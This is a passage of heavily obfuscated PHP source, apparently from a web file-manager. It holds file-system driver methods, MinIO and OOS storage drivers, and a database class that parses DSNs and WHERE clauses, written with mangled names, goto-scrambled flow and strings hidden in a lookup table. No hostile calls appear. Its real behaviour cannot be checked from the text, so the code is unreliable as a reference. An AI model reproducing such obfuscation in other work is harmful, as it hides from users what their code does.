listAll($FŸ‡ÊÕŸ¬³, &$C„ÀÏøÏèÑ = array()) { goto AÄ‚ïéÛÍ; FØÃõ…½†: return $C„ÀÏøÏèÑ; goto EÉÜŠíÌÁ; EÖ”£·ñ…: if (!($d«İÀ—¦äŞ = @opendir($FŸ‡ÊÕŸ¬³))) { return $C„ÀÏøÏèÑ; } while (($a±¨šÜ¦â = readdir($d«İÀ—¦äŞ)) !== !1) { if ($a±¨šÜ¦â == $c¡¢ßïÕĞ[94] || $a±¨šÜ¦â == $c¡¢ßïÕĞ[1226]) { continue; } $bÇ´µÀíèÏ = $FŸ‡ÊÕŸ¬³ . $a±¨šÜ¦â; if (is_dir($bÇ´µÀíèÏ) && !is_link($bÇ´µÀíèÏ)) { $C„ÀÏøÏèÑ[] = array($c¡¢ßïÕĞ[75] => $bÇ´µÀíèÏ . $c¡¢ßïÕĞ[8], $c¡¢ßïÕĞ[76] => 1, $c¡¢ßïÕĞ[83] => @filemtime($bÇ´µÀíèÏ), $c¡¢ßïÕĞ[77] => 0); $this->listAll($bÇ´µÀíèÏ, $C„ÀÏøÏèÑ); } else { $C„ÀÏøÏèÑ[] = array($c¡¢ßïÕĞ[75] => $bÇ´µÀíèÏ, $c¡¢ßïÕĞ[76] => 0, $c¡¢ßïÕĞ[83] => @filemtime($bÇ´µÀíèÏ), $c¡¢ßïÕĞ[77] => $this->size($bÇ´µÀíèÏ)); } } closedir($d«İÀ—¦äŞ); goto FØÃõ…½†; AÄ‚ïéÛÍ: $c¡¢ßïÕĞ =& $_SERVER[òÀöí]; $FŸ‡ÊÕŸ¬³ = $this->iconvSystem($FŸ‡ÊÕŸ¬³); $FŸ‡ÊÕŸ¬³ = rtrim($FŸ‡ÊÕŸ¬³, $c¡¢ßïÕĞ[8]) . $c¡¢ßïÕĞ[8]; goto EÖ”£·ñ…; EÉÜŠíÌÁ: } public function has($AÅ«í‚à…–, $D„¿êÌÙàç = false, $b…Á¨Ü å· = true) { goto AÕ»é™âÑ; EŞ¡õª°é: if ($D„¿êÌÙàç) { return array($e˜ï©Œ‘¿[201] => $fÉ£®ä‰Ùö, $e˜ï©Œ‘¿[202] => $DŠÇ…¢—«Ÿ); } return !1; goto f•ÛÅä; F·Î¨ŞÊ: $C³²‹áàó¨ = 0; while (($E¨³Ğ±ëêÍ = readdir($E‘œË©ÁÃ)) !== !1) { if ($E¨³Ğ±ëêÍ == $e˜ï©Œ‘¿[94] || $E¨³Ğ±ëêÍ == $e˜ï©Œ‘¿[1226]) { continue; } $eØ½ƒÒçæ² = $AÅ«í‚à…– . $E¨³Ğ±ëêÍ; if ($D„¿êÌÙàç) { $C³²‹áàó¨++; if (@is_file($eØ½ƒÒçæ²)) { $fÉ£®ä‰Ùö++; } else { $DŠÇ…¢—«Ÿ++; } if ($C³²‹áàó¨ > 10000) { break; } continue; } if ($b…Á¨Ü å·) { if (@is_file($eØ½ƒÒçæ²)) { return !0; } } else { if (@is_dir($eØ½ƒÒçæ² . $e˜ï©Œ‘¿[8])) { return !0; } } } closedir($E‘œË©ÁÃ); goto EŞ¡õª°é; F«…ˆ®˜ª: if (!($E‘œË©ÁÃ = @opendir($AÅ«í‚à…–))) { return !1; } $fÉ£®ä‰Ùö = 0; $DŠÇ…¢—«Ÿ = 0; goto F·Î¨ŞÊ; AÕ»é™âÑ: $e˜ï©Œ‘¿ =& $_SERVER[òÀöí]; $AÅ«í‚à…– = $this->iconvSystem($AÅ«í‚à…–); $AÅ«í‚à…– = rtrim($AÅ«í‚à…–, $e˜ï©Œ‘¿[8]) . $e˜ï©Œ‘¿[8]; goto F«…ˆ®˜ª; f•ÛÅä: } public function hashSimple($B‘½Ç¡Çâ¶) { goto e¹Şõ†ªŒ­; Fë…Şæ¸—: if ($a›¥Úå™‚ <= $DÄã¦¬òÛî * $Aã‡ğÆÊŞä) { return $this->hashMd5($B‘½Ç¡Çâ¶) . $a›¥Úå™‚; } $DÍ¶‰¸í²Ì = $EìÂïÖñ×Ó[33]; $f–²Ò™¶‰… = intval($a›¥Úå™‚ / $Aã‡ğÆÊŞä); goto dÄŒ•ŞßÇÖ; dÄŒ•ŞßÇÖ: $B™¶”Œ¤÷Ğ = fopen($B‘½Ç¡Çâ¶, $EìÂïÖñ×Ó[1233]); if (!$B™¶”Œ¤÷Ğ) { return $DÍ¶‰¸í²Ì; } for ($bğÈŞÔ˜î = 0; $bğÈŞÔ˜î < $Aã‡ğÆÊŞä; $bğÈŞÔ˜î++) { fseek_64($B™¶”Œ¤÷Ğ, $f–²Ò™¶‰… * $bğÈŞÔ˜î); $DÍ¶‰¸í²Ì .= fread($B™¶”Œ¤÷Ğ, $DÄã¦¬òÛî); } goto d¤Õ¿’¶¥; Fõ±¤©ØÔ: $a›¥Úå™‚ = $this->size($B‘½Ç¡Çâ¶); $DÄã¦¬òÛî = 200; $Aã‡ğÆÊŞä = 50; goto Fë…Şæ¸—; dÇİ¡Œàéã: return md5($DÍ¶‰¸í²Ì) . $a›¥Úå™‚; goto f‰®©Í¸¼; d¤Õ¿’¶¥: fseek_64($B™¶”Œ¤÷Ğ, $a›¥Úå™‚ - $DÄã¦¬òÛî); $DÍ¶‰¸í²Ì .= fread($B™¶”Œ¤÷Ğ, $DÄã¦¬òÛî); fclose($B™¶”Œ¤÷Ğ); goto dÇİ¡Œàéã; e¹Şõ†ªŒ­: $EìÂïÖñ×Ó =& $_SERVER[òÀöí]; if (!$B‘½Ç¡Çâ¶) { return md5($EìÂïÖñ×Ó[33]); } $B‘½Ç¡Çâ¶ = $this->iconvSystem($B‘½Ç¡Çâ¶); goto Fõ±¤©ØÔ; f‰®©Í¸¼: } public function getContent($dã¦¢¦“ÜÕ) { $dã¦¢¦“ÜÕ = $this->iconvSystem($dã¦¢¦“ÜÕ); return file_get_contents($dã¦¢¦“ÜÕ); } public function setContent($bÂ›‡·æ²Ô, $c ®ïè“¸ = '') { $bÂ›‡·æ²Ô = $this->iconvSystem($bÂ›‡·æ²Ô); $dÔøñœä¬ = @file_put_contents($bÂ›‡·æ²Ô, $c ®ïè“¸, LOCK_EX); clearstatcache(); return $dÔøñœä¬ === !1 ? !1 : !0; } public function fileSubstr($F‰ä³™‡á, $Aø˜¡”æÅ = 0, $cÖÍ©Â©‹ = false) { goto fƒÀó¹ñ®î; f‰‹˜²Š›á: fseek_64($a¨ğ‚Æµ¹, $Aø˜¡”æÅ); $A‡ãØ²å› = fread($a¨ğ‚Æµ¹, $cÖÍ©Â©‹); fclose($a¨ğ‚Æµ¹); goto a½ù•Å‹ ; a½ù•Å‹ : return $A‡ãØ²å›; goto Fƒï±á¬¾„; fƒÀó¹ñ®î: $cİ”í‚¨‘§ =& $_SERVER[òÀöí]; $F‰ä³™‡á = $this->iconvSystem($F‰ä³™‡á); if ($cÖÍ©Â©‹ === !1) { $cÖÍ©Â©‹ = $this->size($F‰ä³™‡á); } goto bøª„Ä¢Â; bøª„Ä¢Â: if ($cÖÍ©Â©‹ <= 0) { return $cİ”í‚¨‘§[33]; } $a¨ğ‚Æµ¹ = fopen($F‰ä³™‡á, $cİ”í‚¨‘§[1233]); if (!$a¨ğ‚Æµ¹) { return !1; } goto f‰‹˜²Š›á; Fƒï±á¬¾„: } public function upload($e­Åé•İ›Š, $AÈí…§ô, $bÙå²™º÷ = false, $DîºÇâñğë = REPEAT_REPLACE) { $BËÍğ¯è Ù = $this->copyFile($AÈí…§ô, $e­Åé•İ›Š); return $BËÍğ¯è Ù ? $this->getPathOuter($e­Åé•İ›Š) : !1; } public function setModifyTime($D‹ÍÅÑó™É, $aæ¹—Á‰¹õ = '') { @touch($D‹ÍÅÑó™É, intval($aæ¹—Á‰¹õ)); } public function download($BÆë´Õ³è†, $CâéöˆëÃ´) { return $this->iconvSystem($BÆë´Õ³è†); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($c“åìó§¸) { parent::__construct($c“åìó§¸); $this->signatureVersion($_SERVER[òÀöí][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($BºÄàÕ´¥‘) { parent::__construct($BºÄàÕ´¥‘); $this->signatureVersion($_SERVER[òÀöí][210]); } public function fileOutLink($CÄÂ±——İ) { $D¤å‡µÃ‹í =& $_SERVER[òÀöí]; if (substr($CÄÂ±——İ, 0, 7) == $D¤å‡µÃ‹í[1179]) { $CÄÂ±——İ = $D¤å‡µÃ‹í[1180] . substr($CÄÂ±——İ, 7); } header($D¤å‡µÃ‹í[158] . $CÄÂ±——İ); die; } } goto DË¬—Èº×; B–®¥¢Üï: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\145\161" => "\74\76", "\147\164" => "\x3e", "\x65\147\164" => "\x3e\75", "\154\x74" => "\x3c", "\145\x6c\x74" => "\x3c\75", "\x6e\157\164\154\x69\x6b\145" => "\116\x4f\x54\40\114\x49\x4b\105", "\x6c\151\x6b\145" => "\x4c\111\x4b\105", "\151\156" => "\x49\116", "\156\x6f\164\x69\x6e" => "\116\x4f\x54\x20\111\x4e", "\156\x6f\x74\x20\x69\156" => "\x4e\117\x54\x20\x49\116", "\x62\x65\164\x77\145\145\x6e" => "\102\x45\124\127\105\x45\x4e", "\156\x6f\164\142\145\x74\x77\145\145\156" => "\x4e\117\x54\x20\x42\105\124\127\x45\x45\116", "\156\157\164\40\x62\x65\164\167\145\145\x6e" => "\116\117\124\40\102\105\x54\127\105\105\x4e"); protected $selectSql = "\123\x45\114\105\x43\x54\x25\104\111\123\124\x49\x4e\x43\x54\45\40\45\106\111\105\114\x44\x25\40\106\122\x4f\x4d\40\45\124\101\x42\114\x45\x25\45\112\117\x49\116\x25\x25\127\110\x45\122\x45\45\x25\x47\122\117\125\x50\45\45\110\x41\126\x49\116\x47\45\x25\117\x52\104\105\122\45\x25\114\111\115\x49\x54\45\40\x25\125\116\111\x4f\116\x25\x25\103\117\115\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $FôŠƒóõ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[òÀöí][898], $FôŠƒóõ); } public function factory($b…İìæ½çì = '') { goto cğãÒÆåÃÈ; FâÒ‰Ò…Å¨: return $bÅáÛôÉİÌ; goto dƒ’ÈŒŠß; FÚ áòºŒØ: $this->dbType = ucwords(strtolower($b…İìæ½çì[$e¶–’ƒ­Ò[899]])); $c·‰Á™Œğ¦ = $e¶–’ƒ­Ò[901] . $this->dbType; if (class_exists($c·‰Á™Œğ¦)) { $bÅáÛôÉİÌ = new $c·‰Á™Œğ¦($b…İìæ½çì); if ($e¶–’ƒ­Ò[742] != strtolower($b…İìæ½çì[$e¶–’ƒ­Ò[899]])) { $bÅáÛôÉİÌ->dbType = strtoupper($this->dbType); } else { $bÅáÛôÉİÌ->dbType = $this->_getDsnType($b…İìæ½çì[$e¶–’ƒ­Ò[854]]); } } else { think_exception(think_lang($e¶–’ƒ­Ò[902]) . $e¶–’ƒ­Ò[903] . $c·‰Á™Œğ¦); } goto FâÒ‰Ò…Å¨; cğãÒÆåÃÈ: $e¶–’ƒ­Ò =& $_SERVER[òÀöí]; $b…İìæ½çì = $this->parseConfig($b…İìæ½çì); if (empty($b…İìæ½çì[$e¶–’ƒ­Ò[899]])) { think_exception(think_lang($e¶–’ƒ­Ò[900])); } goto FÚ áòºŒØ; dƒ’ÈŒŠß: } public function __call($d‘™·†Ğ–, $B×¬±éØ‰) { if (method_exists($this, $d‘™·†Ğ–)) { return call_user_func_array(array($this, $d‘™·†Ğ–), $B×¬±éØ‰); } } protected function _getDsnType($EĞÉô¡¦›ˆ) { $C„§„“£Š™ = explode($_SERVER[òÀöí][4], $EĞÉô¡¦›ˆ); $EØ³”÷æ¿ = strtoupper(trim($C„§„“£Š™[0])); return $EØ³”÷æ¿; } private function parseConfig($bè‹Õœ÷Ü = '') { $eÙ­—ÂÑ©¤ =& $_SERVER[òÀöí]; if (!empty($bè‹Õœ÷Ü) && is_string($bè‹Õœ÷Ü)) { $bè‹Õœ÷Ü = $this->parseDSN($bè‹Õœ÷Ü); } elseif (is_array($bè‹Õœ÷Ü)) { $bè‹Õœ÷Ü = array_change_key_case($bè‹Õœ÷Ü); $bè‹Õœ÷Ü = array($eÙ­—ÂÑ©¤[899] => $bè‹Õœ÷Ü[$eÙ­—ÂÑ©¤[741]], $eÙ­—ÂÑ©¤[827] => $bè‹Õœ÷Ü[$eÙ­—ÂÑ©¤[904]], $eÙ­—ÂÑ©¤[828] => $bè‹Õœ÷Ü[$eÙ­—ÂÑ©¤[905]], $eÙ­—ÂÑ©¤[825] => $bè‹Õœ÷Ü[$eÙ­—ÂÑ©¤[906]], $eÙ­—ÂÑ©¤[826] => $bè‹Õœ÷Ü[$eÙ­—ÂÑ©¤[907]], $eÙ­—ÂÑ©¤[17] => $bè‹Õœ÷Ü[$eÙ­—ÂÑ©¤[908]], $eÙ­—ÂÑ©¤[854] => $bè‹Õœ÷Ü[$eÙ­—ÂÑ©¤[743]], $eÙ­—ÂÑ©¤[13] => isset($bè‹Õœ÷Ü[$eÙ­—ÂÑ©¤[909]]) ? $bè‹Õœ÷Ü[$eÙ­—ÂÑ©¤[909]] : array()); } elseif (empty($bè‹Õœ÷Ü)) { if (think_config($eÙ­—ÂÑ©¤[910]) && $eÙ­—ÂÑ©¤[742] != strtolower(think_config($eÙ­—ÂÑ©¤[911]))) { $bè‹Õœ÷Ü = $this->parseDSN(think_config($eÙ­—ÂÑ©¤[910])); } else { $bè‹Õœ÷Ü = array($eÙ­—ÂÑ©¤[899] => think_config($eÙ­—ÂÑ©¤[911]), $eÙ­—ÂÑ©¤[827] => think_config($eÙ­—ÂÑ©¤[912]), $eÙ­—ÂÑ©¤[828] => think_config($eÙ­—ÂÑ©¤[913]), $eÙ­—ÂÑ©¤[825] => think_config($eÙ­—ÂÑ©¤[914]), $eÙ­—ÂÑ©¤[826] => think_config($eÙ­—ÂÑ©¤[915]), $eÙ­—ÂÑ©¤[17] => think_config($eÙ­—ÂÑ©¤[242]), $eÙ­—ÂÑ©¤[854] => think_config($eÙ­—ÂÑ©¤[910]), $eÙ­—ÂÑ©¤[13] => think_config($eÙ­—ÂÑ©¤[916])); } } return $bè‹Õœ÷Ü; } protected function initConnect($ašÀ¶·±³² = true) { if (1 == think_config($_SERVER[òÀöí][18])) { $this->_linkID = $this->multiConnect($ašÀ¶·±³²); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $DªÖïßè•× => $aêÜÊÔãïœ) { $this->_linkID = $aêÜÊÔãïœ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($a¢œ™”âà = false) { $bà¹¡×à¥² =& $_SERVER[òÀöí]; static $cáó‹–§â = array(); if (empty($cáó‹–§â)) { foreach ($this->config as $BËª‘ÚºÌ => $eœ‘‡˜Œ¹¢) { $cáó‹–§â[$BËª‘ÚºÌ] = explode($bà¹¡×à¥²[47], $eœ‘‡˜Œ¹¢); } } if (think_config($bà¹¡×à¥²[917])) { if ($a¢œ™”âà) { $DèÒåªÕ‚³ = floor(mt_rand(0, think_config($bà¹¡×à¥²[918]) - 1)); } else { if (is_numeric(think_config($bà¹¡×à¥²[919]))) { $DèÒåªÕ‚³ = think_config($bà¹¡×à¥²[919]); } else { $DèÒåªÕ‚³ = floor(mt_rand(think_config($bà¹¡×à¥²[918]), count($cáó‹–§â[$bà¹¡×à¥²[825]]) - 1)); } } } else { $DèÒåªÕ‚³ = floor(mt_rand(0, count($cáó‹–§â[$bà¹¡×à¥²[825]]) - 1)); } $Bç£·Ü˜Æ = array($bà¹¡×à¥²[827] => isset($cáó‹–§â[$bà¹¡×à¥²[827]][$DèÒåªÕ‚³]) ? $cáó‹–§â[$bà¹¡×à¥²[827]][$DèÒåªÕ‚³] : $cáó‹–§â[$bà¹¡×à¥²[827]][0], $bà¹¡×à¥²[828] => isset($cáó‹–§â[$bà¹¡×à¥²[828]][$DèÒåªÕ‚³]) ? $cáó‹–§â[$bà¹¡×à¥²[828]][$DèÒåªÕ‚³] : $cáó‹–§â[$bà¹¡×à¥²[828]][0], $bà¹¡×à¥²[825] => isset($cáó‹–§â[$bà¹¡×à¥²[825]][$DèÒåªÕ‚³]) ? $cáó‹–§â[$bà¹¡×à¥²[825]][$DèÒåªÕ‚³] : $cáó‹–§â[$bà¹¡×à¥²[825]][0], $bà¹¡×à¥²[826] => isset($cáó‹–§â[$bà¹¡×à¥²[826]][$DèÒåªÕ‚³]) ? $cáó‹–§â[$bà¹¡×à¥²[826]][$DèÒåªÕ‚³] : $cáó‹–§â[$bà¹¡×à¥²[826]][0], $bà¹¡×à¥²[17] => isset($cáó‹–§â[$bà¹¡×à¥²[17]][$DèÒåªÕ‚³]) ? $cáó‹–§â[$bà¹¡×à¥²[17]][$DèÒåªÕ‚³] : $cáó‹–§â[$bà¹¡×à¥²[17]][0], $bà¹¡×à¥²[854] => isset($cáó‹–§â[$bà¹¡×à¥²[854]][$DèÒåªÕ‚³]) ? $cáó‹–§â[$bà¹¡×à¥²[854]][$DèÒåªÕ‚³] : $cáó‹–§â[$bà¹¡×à¥²[854]][0], $bà¹¡×à¥²[13] => isset($cáó‹–§â[$bà¹¡×à¥²[13]][$DèÒåªÕ‚³]) ? $cáó‹–§â[$bà¹¡×à¥²[13]][$DèÒåªÕ‚³] : $cáó‹–§â[$bà¹¡×à¥²[13]][0]); return $this->connect($Bç£·Ü˜Æ, $DèÒåªÕ‚³); } public function parseDSN($B³–¯–èäŒ) { $bĞÊò°œ§Ñ =& $_SERVER[òÀöí]; if (empty($B³–¯–èäŒ)) { return !1; } $b‘ˆÂ…‰Ç‹ = parse_url($B³–¯–èäŒ); if ($b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[174]]) { $c³ÀŒÎÇ¤ = array($bĞÊò°œ§Ñ[899] => $b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[174]], $bĞÊò°œ§Ñ[827] => isset($b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[551]]) ? $b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[551]] : $bĞÊò°œ§Ñ[33], $bĞÊò°œ§Ñ[828] => isset($b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[920]]) ? $b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[920]] : $bĞÊò°œ§Ñ[33], $bĞÊò°œ§Ñ[825] => isset($b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[175]]) ? $b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[175]] : $bĞÊò°œ§Ñ[33], $bĞÊò°œ§Ñ[826] => isset($b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[176]]) ? $b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[176]] : $bĞÊò°œ§Ñ[33], $bĞÊò°œ§Ñ[17] => isset($b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[75]]) ? substr($b‘ˆÂ…‰Ç‹[$bĞÊò°œ§Ñ[75]], 1) : $bĞÊò°œ§Ñ[33]); } else { preg_match($bĞÊò°œ§Ñ[921], trim($B³–¯–èäŒ), $eÓÙÌ¢à†); $c³ÀŒÎÇ¤ = array($bĞÊò°œ§Ñ[899] => $eÓÙÌ¢à†[1], $bĞÊò°œ§Ñ[827] => $eÓÙÌ¢à†[2], $bĞÊò°œ§Ñ[828] => $eÓÙÌ¢à†[3], $bĞÊò°œ§Ñ[825] => $eÓÙÌ¢à†[4], $bĞÊò°œ§Ñ[826] => $eÓÙÌ¢à†[5], $bĞÊò°œ§Ñ[17] => $eÓÙÌ¢à†[6]); } $c³ÀŒÎÇ¤[$bĞÊò°œ§Ñ[854]] = $bĞÊò°œ§Ñ[33]; return $c³ÀŒÎÇ¤; } protected function debug() { $fÃ“Ùß¯Ú« =& $_SERVER[òÀöí]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $fÃ“Ùß¯Ú«[922]; if (think_config($fÃ“Ùß¯Ú«[923])) { think_status($fÃ“Ùß¯Ú«[924]); think_trace($this->queryStr . $fÃ“Ùß¯Ú«[925] . think_status($fÃ“Ùß¯Ú«[20], $fÃ“Ùß¯Ú«[924], 6) . $fÃ“Ùß¯Ú«[926], $fÃ“Ùß¯Ú«[33], $fÃ“Ùß¯Ú«[927]); } } protected function parseLock($D³ˆÇäö» = false) { $c®ôµñ‹’ù =& $_SERVER[òÀöí]; if (!$D³ˆÇäö») { return $c®ôµñ‹’ù[33]; } if ($c®ôµñ‹’ù[856] == $this->dbType) { return $c®ôµñ‹’ù[928]; } return $c®ôµñ‹’ù[929]; } protected function parseSet($B¼·åÈÖ˜) { $e™¼ÄÃ³œê =& $_SERVER[òÀöí]; foreach ($B¼·åÈÖ˜ as $DïÀö±·œÁ => $CùÜ…ÈëáÌ) { if (is_array($CùÜ…ÈëáÌ) && $e™¼ÄÃ³œê[293] == $CùÜ…ÈëáÌ[0]) { $BÔö©¼¼¾[] = $this->parseKey($DïÀö±·œÁ) . $e™¼ÄÃ³œê[930] . $CùÜ…ÈëáÌ[1]; } elseif (is_scalar($CùÜ…ÈëáÌ) || is_null($CùÜ…ÈëáÌ)) { $BÔö©¼¼¾[] = $this->parseKey($DïÀö±·œÁ) . $e™¼ÄÃ³œê[930] . $this->parseValue($CùÜ…ÈëáÌ); } } return $e™¼ÄÃ³œê[931] . implode($e™¼ÄÃ³œê[47], $BÔö©¼¼¾); } protected function bindParam($a„„Ÿà¸, $eÚ®²£ÖØ) { $this->bind[$_SERVER[òÀöí][4] . $a„„Ÿà¸] = $eÚ®²£ÖØ; } protected function parseBind($aÖ¦Ñ¤ÖÇò) { $aÖ¦Ñ¤ÖÇò = array_merge($this->bind, $aÖ¦Ñ¤ÖÇò); $this->bind = array(); return $aÖ¦Ñ¤ÖÇò; } function parseKey(&$FîÆà‡©, $FŠ™¢«»Á© = true) { if ($FŠ™¢«»Á©) { $FîÆà‡© = $this->parseKeyCheck($FîÆà‡©); } return $FîÆà‡©; } function parseKeyCheck($DÛŸ¼Ååñ) { $a£ãö¨œÔÆ =& $_SERVER[òÀöí]; $DÛŸ¼Ååñ = trim($DÛŸ¼Ååñ); if (!preg_match($a£ãö¨œÔÆ[932], $DÛŸ¼Ååñ)) { think_exception($a£ãö¨œÔÆ[933] . $DÛŸ¼Ååñ); } return $DÛŸ¼Ååñ; } protected function parseValue($BÈÓˆÈÇƒ·) { $cÑ©äâÕ„Ò =& $_SERVER[òÀöí]; if (is_string($BÈÓˆÈÇƒ·)) { $BÈÓˆÈÇƒ· = $cÑ©äâÕ„Ò[895] . $this->escapeString($BÈÓˆÈÇƒ·) . $cÑ©äâÕ„Ò[895]; } elseif (isset($BÈÓˆÈÇƒ·[0]) && is_string($BÈÓˆÈÇƒ·[0]) && strtolower($BÈÓˆÈÇƒ·[0]) == $cÑ©äâÕ„Ò[293]) { $BÈÓˆÈÇƒ· = $this->escapeString($BÈÓˆÈÇƒ·[1]); } elseif (is_array($BÈÓˆÈÇƒ·)) { $BÈÓˆÈÇƒ· = array_map(array($this, $cÑ©äâÕ„Ò[896]), $BÈÓˆÈÇƒ·); } elseif (is_bool($BÈÓˆÈÇƒ·)) { $BÈÓˆÈÇƒ· = $BÈÓˆÈÇƒ· ? $cÑ©äâÕ„Ò[86] : $cÑ©äâÕ„Ò[486]; } elseif (is_null($BÈÓˆÈÇƒ·)) { $BÈÓˆÈÇƒ· = $cÑ©äâÕ„Ò[102]; } return $BÈÓˆÈÇƒ·; } protected function parseField($F…Ö…Ç©á) { $eğÅ®­¶á™ =& $_SERVER[òÀöí]; if (is_string($F…Ö…Ç©á) && strpos($F…Ö…Ç©á, $eğÅ®­¶á™[47])) { $F…Ö…Ç©á = explode($eğÅ®­¶á™[47], $F…Ö…Ç©á); } if (is_array($F…Ö…Ç©á)) { $fÜØØ‘æÚø = array(); foreach ($F…Ö…Ç©á as $d”¸ØÓ›ã => $DŸİªÖÇè‘) { if (!is_numeric($d”¸ØÓ›ã)) { $fÜØØ‘æÚø[] = $this->parseKey($d”¸ØÓ›ã) . $eğÅ®­¶á™[934] . $this->parseKey($DŸİªÖÇè‘); } else { $fÜØØ‘æÚø[] = $this->parseKey($DŸİªÖÇè‘); } } $e¿™˜Ùô• = implode($eğÅ®­¶á™[47], $fÜØØ‘æÚø); } elseif (is_string($F…Ö…Ç©á) && !empty($F…Ö…Ç©á)) { $e¿™˜Ùô• = $F…Ö…Ç©á; } else { $e¿™˜Ùô• = $eğÅ®­¶á™[182]; } return $e¿™˜Ùô•; } protected function parseTable($EœåÂôØÖè) { $eš¾ë¾èÛ =& $_SERVER[òÀöí]; if (is_array($EœåÂôØÖè)) { $CÚğ°èƒ» = array(); foreach ($EœåÂôØÖè as $DŞàÒÛ¯Ì® => $E‡…‚Îµ‚Š) { if (!is_numeric($DŞàÒÛ¯Ì®)) { $CÚğ°èƒ»[] = $this->parseKey($DŞàÒÛ¯Ì®) . $eš¾ë¾èÛ[50] . $this->parseKey($E‡…‚Îµ‚Š); } else { $CÚğ°èƒ»[] = $this->parseKey($DŞàÒÛ¯Ì®); } } $EœåÂôØÖè = $CÚğ°èƒ»; } elseif (is_string($EœåÂôØÖè)) { if (strstr($EœåÂôØÖè, $eš¾ë¾èÛ[50])) { return $EœåÂôØÖè; } $EœåÂôØÖè = explode($eš¾ë¾èÛ[47], $EœåÂôØÖè); array_walk($EœåÂôØÖè, array($this, $eš¾ë¾èÛ[845])); } return $eš¾ë¾èÛ[839] . trim(implode($eš¾ë¾èÛ[935], $EœåÂôØÖè), $eš¾ë¾èÛ[377]) . $eš¾ë¾èÛ[839]; } protected function parseWhere($F«¸ÚÛæçÚ) { $eï„åµ»«õ =& $_SERVER[òÀöí]; $aÉ”„…º¾º = $eï„åµ»«õ[33]; if (is_string($F«¸ÚÛæçÚ)) { $aÉ”„…º¾º = $F«¸ÚÛæçÚ; } else { $D”ìò¼á§¼ = isset($F«¸ÚÛæçÚ[$eï„åµ»«õ[936]]) ? strtoupper($F«¸ÚÛæçÚ[$eï„åµ»«õ[936]]) : $eï„åµ»«õ[33]; if (in_array($D”ìò¼á§¼, array($eï„åµ»«õ[937], $eï„åµ»«õ[938], $eï„åµ»«õ[939]))) { $D”ìò¼á§¼ = $eï„åµ»«õ[50] . $D”ìò¼á§¼ . $eï„åµ»«õ[50]; unset($F«¸ÚÛæçÚ[$eï„åµ»«õ[936]]); } else { $D”ìò¼á§¼ = $eï„åµ»«õ[940]; } foreach ($F«¸ÚÛæçÚ as $C†ùê¡ÂÉ• => $eÓŞ“œŒ‚Ö) { $aÉ”„…º¾º .= $eï„åµ»«õ[273]; if (is_numeric($C†ùê¡ÂÉ•)) { $C†ùê¡ÂÉ• = $eï„åµ»«õ[941]; } if (0 === strpos($C†ùê¡ÂÉ•, $eï„åµ»«õ[70])) { $aÉ”„…º¾º .= $this->parseThinkWhere($C†ùê¡ÂÉ•, $eÓŞ“œŒ‚Ö); } else { if (!preg_match($eï„åµ»«õ[942], trim($C†ùê¡ÂÉ•))) { think_exception(think_lang($eï„åµ»«õ[943]) . $eï„åµ»«õ[4] . $C†ùê¡ÂÉ•); } $BØŠÈ©ÃÄ = is_array($eÓŞ“œŒ‚Ö) && isset($eÓŞ“œŒ‚Ö[$eï„åµ»«õ[944]]); $C†ùê¡ÂÉ• = trim($C†ùê¡ÂÉ•); if (strpos($C†ùê¡ÂÉ•, $eï„åµ»«õ[279])) { $D¸³‚à•ã = explode($eï„åµ»«õ[279], $C†ùê¡ÂÉ•); $e¨…ÀğÅ„ = array(); foreach ($D¸³‚à•ã as $BÅï·­Ï¿Ï => $Bâàö«Æ¯„) { $fğ¢Å óä = $BØŠÈ©ÃÄ ? $eÓŞ“œŒ‚Ö[$BÅï·­Ï¿Ï] : $eÓŞ“œŒ‚Ö; $e¨…ÀğÅ„[] = $eï„åµ»«õ[256] . $this->parseWhereItem($this->parseKey($Bâàö«Æ¯„), $fğ¢Å óä) . $eï„åµ»«õ[844]; } $aÉ”„…º¾º .= implode($eï„åµ»«õ[945], $e¨…ÀğÅ„); } elseif (strpos($C†ùê¡ÂÉ•, $eï„åµ»«õ[280])) { $D¸³‚à•ã = explode($eï„åµ»«õ[280], $C†ùê¡ÂÉ•); $e¨…ÀğÅ„ = array(); foreach ($D¸³‚à•ã as $BÅï·­Ï¿Ï => $Bâàö«Æ¯„) { $fğ¢Å óä = $BØŠÈ©ÃÄ ? $eÓŞ“œŒ‚Ö[$BÅï·­Ï¿Ï] : $eÓŞ“œŒ‚Ö; $e¨…ÀğÅ„[] = $eï„åµ»«õ[256] . $this->parseWhereItem($this->parseKey($Bâàö«Æ¯„), $fğ¢Å óä) . $eï„åµ»«õ[844]; } $aÉ”„…º¾º .= implode($eï„åµ»«õ[940], $e¨…ÀğÅ„); } else { $aÉ”„…º¾º .= $this->parseWhereItem($this->parseKey($C†ùê¡ÂÉ•), $eÓŞ“œŒ‚Ö); } } $aÉ”„…º¾º .= $eï„åµ»«õ[274] . $D”ìò¼á§¼; } $aÉ”„…º¾º = substr($aÉ”„…º¾º, 0, 